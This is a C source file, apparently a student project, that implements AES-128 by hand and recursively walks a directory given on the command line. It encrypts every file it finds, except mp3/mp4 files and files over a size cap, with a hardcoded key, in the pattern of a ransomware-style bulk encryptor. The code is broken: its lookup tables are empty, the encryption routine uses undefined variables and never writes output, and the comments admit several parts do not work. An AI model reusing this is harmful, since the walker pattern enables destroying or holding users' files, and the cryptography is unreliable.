/*Julien MAES*/
/*Hugo MAGERAT*/
/*FIPS 197*/
/* angelfire.com/biz7/atleast/mix_columns.pdf*//*fut très TRES utile pour comprendre*/
#include <stdio.h>
#include <dirent.h>
#include <string.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdlib.h>
#include <stdint.h>
#include <math.h>

#define MAXBYTE 8796093022208
#define BUFFER_SIZE 16

static int step = 0;


static const uint8_t rsbox[256] = {
};

static const uint8_t sbox[256] = {
 };

static const uint8_t multx02box[256] = {
};

static const uint8_t multx03box[256] = {
};

static const uint8_t multx09box[256] = {
};

static const uint8_t multx11box[256] = {
};

static const uint8_t multx13box[256] = {
};

static const uint8_t multx14box[256] = {
};
  
static const uint8_t Rcon[10][4] = {{0x01,0x00, 0x00, 0x00},{0x02,0x00, 0x00, 0x00},{0x04,0x00, 0x00, 0x00},{0x08,0x00, 0x00, 0x00},{0x10,0x00, 0x00, 0x00},{0x20,0x00, 0x00, 0x00},{0x40,0x00, 0x00, 0x00},{0x80,0x00, 0x00, 0x00},{0x1b,0x00, 0x00, 0x00},{0x36,0x00, 0x00, 0x00}};


void Key_schedule(uint8_t (*key_dim)[11][4][4]){
	int round = 0;
	for (int i=0; i<10; i++){
		uint8_t W0[4] = {(*key_dim)[round][0][0], (*key_dim)[round][1][0], (*key_dim)[round][2][0], (*key_dim)[round][3][0]};
		uint8_t W1[4] = {(*key_dim)[round][0][1], (*key_dim)[round][1][1], (*key_dim)[round][2][1], (*key_dim)[round][3][1]};
		uint8_t W2[4] = {(*key_dim)[round][0][2], (*key_dim)[round][1][2], (*key_dim)[round][2][2], (*key_dim)[round][3][2]};
		uint8_t W3[4] = {(*key_dim)[round][0][3], (*key_dim)[round][1][3], (*key_dim)[round][2][3], (*key_dim)[round][3][3]};
		uint8_t W4[4] = {(*key_dim)[round][1][3], (*key_dim)[round][2][3], (*key_dim)[round][3][3], (*key_dim)[round][0][3]};
		uint8_t W5[4];
		uint8_t W6[4];
		uint8_t W7[4];
		for (int i=0; i<4; i++){
			W4[i] =  sbox[(int)W4[i]];
		}
		for (int i=0; i<4; i++){
			W4[i] = W4[i]^W0[i]^Rcon[round][i];
		}
		for (int i=0; i<4; i++){
			W5[i] = W4[i]^W1[i];
			W6[i] = W5[i]^W2[i];
			W7[i] = W6[i]^W3[i];
		}
		round++;
		for (int i=0; i<4; i++){
			switch(i){
				case 0: 
					for (int j=0 ; j<4; j++){	
						(*key_dim)[round][j][0] = W4[j];
					}
					break;
				case 1: 
					for (int j=0 ; j<4; j++){	
						(*key_dim)[round][j][1] = W5[j];
					}
					break;
				case 2:
					for (int j=0 ; j<4; j++){	
						(*key_dim)[round][j][2] = W6[j];
					}
					break;
				case 3:
					for (int j=0 ; j<4; j++){	
						(*key_dim)[round][j][3] = W7[j];
					}
					break;
			}		
		}
	}
}


void AddRoundKey(uint8_t (*plaintext_dim)[4][4], uint8_t  (*key_dim)[11][4][4]){
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			(*plaintext_dim)[i][j] = (*plaintext_dim)[i][j]^(*key_dim)[(step)][i][j];
		}
	}
	step++;
}

void SubBytes(uint8_t (*plaintext_dim)[4][4]){
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			(*plaintext_dim)[i][j] = sbox[(int)(*plaintext_dim)[i][j]];
		}
	}
}

void ShiftRows(uint8_t (*plaintext_dim)[4][4]){ 
	uint8_t pending_dim[4][4];
	for (int i=0; i<4; i++){
		int a =0;
		for (int j=0 ; j<4; j++){
			if (j+i<4){
				pending_dim[i][j] = (*plaintext_dim)[i][(j+i)];
			}
			else{
				pending_dim[i][j] = (*plaintext_dim)[i][a];
				a++;
			}		
		}
	}
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			(*plaintext_dim)[i][j] = pending_dim[i][j];
		}
	}
}

void MixColoumns(uint8_t (*plaintext_dim)[4][4]){
	uint8_t pending[4][4];
	for (int k=0; k<4; k++){
		pending [0][k] = multx02box[(*plaintext_dim)[0][k]]^multx03box[(*plaintext_dim)[1][k]]^(*plaintext_dim)[2][k]^(*plaintext_dim)[3][k];
		pending [1][k] = (*plaintext_dim)[0][k]^multx02box[(*plaintext_dim)[1][k]]^multx03box[(*plaintext_dim)[2][k]]^(*plaintext_dim)[3][k];
		pending [2][k] = (*plaintext_dim)[0][k]^(*plaintext_dim)[1][k]^multx02box[(*plaintext_dim)[2][k]]^multx03box[(*plaintext_dim)[3][k]];
		pending [3][k] = multx03box[(*plaintext_dim)[0][k]]^(*plaintext_dim)[1][k]^(*plaintext_dim)[2][k]^multx02box[(*plaintext_dim)[3][k]];
			
	}
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			(*plaintext_dim)[i][j] = pending[i][j];
			}
	}
}

void inv_AddRoundKey(uint8_t (*plaintext_dim)[4][4], uint8_t  (*key_dim)[11][4][4]){
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			(*plaintext_dim)[i][j] = (*plaintext_dim)[i][j]^(*key_dim)[(10-step)][i][j];
		}
	}
	step++;
}

void inv_SubBytes(uint8_t (*plaintext_dim)[4][4]){
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			(*plaintext_dim)[i][j] = rsbox[(int)(*plaintext_dim)[i][j]];
		}
	}
}

void inv_ShiftRows(uint8_t (*plaintext_dim)[4][4]){ /* a tester*/
	uint8_t pending_dim[4][4];
	for (int i=0; i<4; i++){
		int a =0;
		int b = 4-i;
		for (int j=0 ; j<4; j++){
			if (j-i<0){
				pending_dim[i][j] = (*plaintext_dim)[i][(b)];
				b++;
			}
			else{
				pending_dim[i][j] = (*plaintext_dim)[i][a];
				a++;		
			}
			
		}
	}
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			(*plaintext_dim)[i][j] = pending_dim[i][j];
		}
	}
}
void inv_MixColoumns(uint8_t (*plaintext_dim)[4][4]){ /* a tester*/
	uint8_t pending[4][4];
	for (int k=0; k<4; k++){
		pending [0][k] = multx14box[(*plaintext_dim)[0][k]]^multx11box[(*plaintext_dim)[1][k]]^multx13box[(*plaintext_dim)[2][k]]^multx09box[(*plaintext_dim)[3][k]];
		pending [1][k] = multx09box[(*plaintext_dim)[0][k]]^multx14box[(*plaintext_dim)[1][k]]^multx11box[(*plaintext_dim)[2][k]]^multx13box[(*plaintext_dim)[3][k]];
		pending [2][k] = multx13box[(*plaintext_dim)[0][k]]^multx09box[(*plaintext_dim)[1][k]]^multx14box[(*plaintext_dim)[2][k]]^multx11box[(*plaintext_dim)[3][k]];
		pending [3][k] = multx11box[(*plaintext_dim)[0][k]]^multx13box[(*plaintext_dim)[1][k]]^multx09box[(*plaintext_dim)[2][k]]^multx14box[(*plaintext_dim)[3][k]];
			
	}
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			(*plaintext_dim)[i][j] = pending[i][j];
			}
	}
}

void aes_encrypt(uint8_t* plaintext_line[], uint8_t* key_line[]){
	uint8_t key_dim[11][4][4]; 
	int a = 0;
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			key_dim[0][j][i] = key_line[a];
			a++;
			}
	}

	uint8_t plaintext_dim[4][4]; 
	a = 0;
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			plaintext_dim[j][i] = plaintext_line[a];
			a++;
			}
	}
	Key_schedule(&key_dim);  /*ok*/
	AddRoundKey(&plaintext_dim, &key_dim); /*ok*/
	for ( int i = 0; i<9 ; i++){
		SubBytes(&plaintext_dim); /*ok*/
		ShiftRows(&plaintext_dim); /*ok*/
		MixColoumns(&plaintext_dim); /*ok*/
		AddRoundKey(&plaintext_dim, &key_dim);
	}
	SubBytes(&plaintext_dim);
	ShiftRows(&plaintext_dim);	
	AddRoundKey(&plaintext_dim, &key_dim);
	a = 0;
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			plaintext_line[a] = plaintext_dim[j][i];
			a++;
			}
	}
}

void aes_decrypt(uint8_t* plaintext_line[], uint8_t* key_line[]){
	uint8_t key_dim[11][4][4]; 
	int a = 0;
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			key_dim[0][j][i] = key_line[a];
			a++;
			}
	}

	uint8_t plaintext_dim[4][4]; 
	a = 0;
	for (int i=0; i<4; i++){
		for (int j=0 ; j<4; j++){
			plaintext_dim[j][i] = plaintext_line[a];
			a++;
			}
	}
	Key_schedule(&key_dim);/*ok*/
	AddRoundKey(&plaintext_dim, &key_dim);/*ok*/
	for ( int i = 0; i<9 ; i++){
		inv_ShiftRows(&plaintext_dim);/*ok*/
		inv_SubBytes(&plaintext_dim);/*ok*/
		AddRoundKey(&plaintext_dim, &key_dim);
		inv_MixColoumns(&plaintext_dim); /*ok*/
	}
	inv_ShiftRows(&plaintext_dim); 
	inv_SubBytes(&plaintext_dim);	
	AddRoundKey(&plaintext_dim, &key_dim);	
	for (int i=0; i<4; i++){
			for (int j=0 ; j<4; j++){
				printf("%hhx\n", plaintext_dim[j][i]);
			}
	} 

}
int stat_file(const char* name){
	struct stat stat_file;
	stat(name, &stat_file);
	int size = stat_file.st_size;
	printf("file size: %d\n", size);
	if (size >=MAXBYTE){
		return 1;
	}
	else{
		return 0;
	}
}

int extension_file(const char* name){
	const char* ext = strrchr(name, '.'); /*prend la dernière occurence de '.' */
	if(!ext){
		
	}
	else{
		printf("extension is %s\n", ext +1); /* comprendre ext +1*/
		if (strcmp((ext +1), "mp3") == 0 || strcmp((ext +1), "mp4") == 0){
			return 1;
			printf("ici \n");
		}
		else{
			return 0;
		}
	}

}

int encrypt(const char* path){
	printf("on va au chiffrement \n");
	FILE* fp = fopen(path, "rb");
  	if (!fp) {
    		printf("impossible d'ouvrir le fichier : %s\n", path);
   		return 1;
  	}
  	size_t buffer_size = 1024;
  	unsigned char *buffer = malloc(buffer_size);
  	if(buffer == NULL){
  		printf("erreur d'allocation : buffer");
   		return 1;
  	}
  	size_t num_octet = 0;
  	unsigned char octet;
  	while (fread(&octet, 1, 1, fp) == 1){
  		buffer[num_octet] = octet;
  		num_octet++;
  		if (num_octet == buffer_size){
  			buffer_size*=2;
  			buffer = realloc(buffer, (buffer_size));
  			if(buffer == NULL){
  				printf("erreur de réallocation : buffer");
   				return 1;
  			}
  		}
  		
  	}	
  	fclose(fp);
  	int len = strlen(buffer);
  	int max = floor(len/16);
  	uint8_t plaintext[max][16];
  	for (int w=0; w<max ; w++){
  		for (int x=0; x<16 ; x++){
  			plaintext[w][x] = buffer[(w*16)+x];
  		}
  	}
  	free(buffer);
  	uint8_t* key_line[16] = {84, 0x68, 0x61, 0x74,
				0x73, 0x20, 0x6d, 0x79,
				0x20, 0x4b, 0x75, 0x6e,
				0x67, 0x20, 0x46, 0x75};
	for (int w=0; w<max ; w++){
  		aes_encrypt(plaintext_line, key_line); //marchePas --> voir pour return l'array via pointeur
  		a = 0;
		for (int i=0; i<16; i++){
			plaintext[w][i] = plaintext_line[i];
		}
  	}	
}

int ls(const char* name){
	DIR* dir = opendir(name);
	printf("Reading files in: %s\n", name);
	if (dir == NULL){ 
		return 1;
		}
	struct dirent* entity;
	entity = readdir(dir);
	while(entity != NULL ){
		printf("%d %s\n", entity->d_type , entity->d_name);
		/* problème gestion d_type, ne donne que 8 et 4 et pas le reste*/
		if (entity->d_type == DT_DIR && strcmp(entity->d_name, ".") != 0 && strcmp(entity->d_name, "..") != 0){
			char path[100] = {0};    /*Peut-être une alocation dynamique si possible*/
			strcat(path, name);
			strcat(path, "/");
			strcat(path, entity->d_name);
			ls(path);
		}
		else{
		if (strcmp(entity->d_name, ".") != 0 && strcmp(entity->d_name, "..") != 0){
			int rule1 = stat_file(entity->d_name);
			int rule2 = extension_file(entity->d_name);
			printf("respet des regles %d %d \n", rule1, rule2);
			if(rule1 == 0 && rule2 == 0 ){
					char file_path[100] = {0};
					strcat(file_path, name);
					strcat(file_path, "/");
					strcat(file_path, entity->d_name);
					encrypt(file_path);
				} 
			}
		}
		entity = readdir(dir);
	}
	closedir(dir);
	return 0;
}
int main(int argc, char* argv[]) {
  	if (argc < 2) {
    		printf("Veuillez fournir un chemin de fichier");
    		return 1;
  	}
  	char* file_path = argv[1];
  	// vérifie que le chemin est correcte et atteingnable avec les droits fourni au programme.
  	if (access(file_path, R_OK) != 0){
  		printf("Impossible d'accéder au fichier");
  		return 1;
  	}	
	ls(file_path);
}
